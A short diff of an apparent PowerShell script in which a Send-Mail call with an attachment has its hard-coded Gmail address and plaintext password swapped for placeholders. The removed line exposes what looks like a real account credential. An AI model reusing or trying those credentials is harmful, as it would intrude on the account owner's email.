@@ -49,7 +49,7 @@ Function Send-Mail
 }
 
 try {
-	Send-Mail -To "galaxy21982198@gmail.com" -From "galaxy21982198@gmail.com" -Password "8912eDuuD?" -Body $Body -Subject $Subj -Attachment $Att
+	Send-Mail -To "youremail@gmail.com" -From "youremail@gmail.com" -Password "youremailpassword" -Body $Body -Subject $Subj -Attachment $Att
 } catch {
     exit 4;
 }
